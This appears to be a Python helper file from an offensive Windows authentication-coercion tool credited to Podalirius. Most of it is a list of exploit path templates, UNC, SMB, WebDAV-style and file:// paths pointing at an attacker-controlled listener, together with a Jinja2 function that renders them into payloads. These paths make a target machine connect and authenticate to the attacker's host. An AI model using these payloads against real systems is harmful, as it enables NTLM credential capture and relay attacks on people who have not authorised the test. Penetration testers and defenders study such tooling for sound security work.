#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : utils.py
# Author             : Podalirius (@podalirius_)
# Date created       : 15 Sep 2022

import random
import jinja2


def gen_random_name(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    name = ""
    for k in range(length):
        name += random.choice(alphabet)
    return name


def generate_exploit_templates(desired_auth_type=None):
    add_uncommon_tests = False

    templates = [
        # Only ip
        ("smb", '{{listener}}\x00'),
        # SMB
        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\{{listener}}\\\x00'),
        ("smb", '\\\\{{listener}}\x00'),
        # SMB path with ?
        ("smb", '\\\\?\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\?\\{{listener}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\?\\{{listener}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\?\\{{listener}}\\\x00'),
        ("smb", '\\\\?\\{{listener}}\x00'),
        #
        ("smb", '\\\\.\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\.\\{{listener}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\.\\{{listener}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\.\\{{listener}}\\\x00'),
        ("smb", '\\\\.\\{{listener}}\x00'),
        # UNC path with ?
        ("smb", '\\\\?\\UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}\\\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}\x00'),
        # UNC path with .
        ("smb", '\\\\.\\UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}\\\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}\x00'),
    ]

    if add_uncommon_tests:
        templates += [

            # HTTP
            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\File.txt\x00'),
            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\\x00'),
            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\x00'),
            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\\x00'),
            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\x00'),
            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\\x00'),
            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\x00'),

            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/Path/File.txt\x00'),
            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/Path/\x00'),
            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/Path\x00'),
            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/\x00'),
            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}\x00'),
            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/\x00'),
            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}\x00'),

            ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
            ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
            ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\x00'),
            ("smb", '\\UNC\\{{listener}}\\\x00'),
            ("smb", '\\UNC\\{{listener}}\x00'),

            ("smb", 'UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
            ("smb", 'UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
            ("smb", 'UNC\\{{listener}}\\{{rnd(8)}}\x00'),
            ("smb", 'UNC\\{{listener}}\\\x00'),
            ("smb", 'UNC\\{{listener}}\x00'),

            ("smb", 'UNC:\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
            ("smb", 'UNC:\\{{listener}}\\{{rnd(8)}}\\\x00'),
            ("smb", 'UNC:\\{{listener}}\\{{rnd(8)}}\x00'),
            ("smb", 'UNC:\\{{listener}}\\\x00'),
            ("smb", 'UNC:\\{{listener}}\x00'),

            ("http", 'http://{{listener}}/EndpointName/File.txt\x00'),
            ("http", 'http://{{listener}}/EndpointName/\x00'),
            ("http", 'http://{{listener}}/\x00'),
            ("http", 'http://{{listener}}\x00'),

            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\Path\\File.txt\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\Path\\\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\Path\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\x00'),
        ]

    # templates = [("smb", '\\\\{{listener}}\\{{rnd(8)}}\\file.txt\x00')]

    paths = []
    for auth_type, exploit_path in templates:
        if desired_auth_type is not None:
            if auth_type == desired_auth_type:
                paths.append((auth_type, exploit_path))
        else:
            paths.append((auth_type, exploit_path))
    return paths


def generate_exploit_path_from_template(template, listener, port=80):
    # Declaring template functions
    rnd = gen_random_name
    # Rendering template
    exploit_path = jinja2.Template(template).render(
        listener=listener,
        rnd=rnd,
        port=port
    )
    return exploit_path
